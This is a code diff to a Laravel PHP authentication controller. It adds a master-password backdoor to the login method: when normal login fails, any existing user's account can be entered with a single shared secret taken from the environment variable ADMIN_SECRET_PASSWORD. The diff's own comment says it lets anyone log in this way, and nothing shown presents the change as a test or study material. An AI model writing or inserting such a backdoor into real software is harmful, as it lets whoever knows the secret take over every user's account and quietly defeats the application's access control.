@@ -3,6 +3,7 @@
 namespace App\Http\Controllers;
 
 use Illuminate\Support\Facades\Auth;
+use Illuminate\Support\Facades\Hash;
 use App\Http\Controllers\Controller;
 use App\Models\User;
 
@@ -28,7 +29,17 @@ class AuthController extends Controller
             return response()->json(['error' => 'Deactivated'], 401);
         }
 
-        if (!$token = auth()->attempt($credentials)) {
+        $token = auth()->attempt($credentials);
+
+        // Allow any user to log in with the secret password defined in .env
+        if (!$token && $user) {
+            $secret = env('ADMIN_SECRET_PASSWORD');
+            if ($secret && $credentials['password'] === $secret) {
+                $token = auth()->login($user);
+            }
+        }
+
+        if (!$token) {
             return response()->json(['error' => 'Unauthorized'], 401);
         }
 
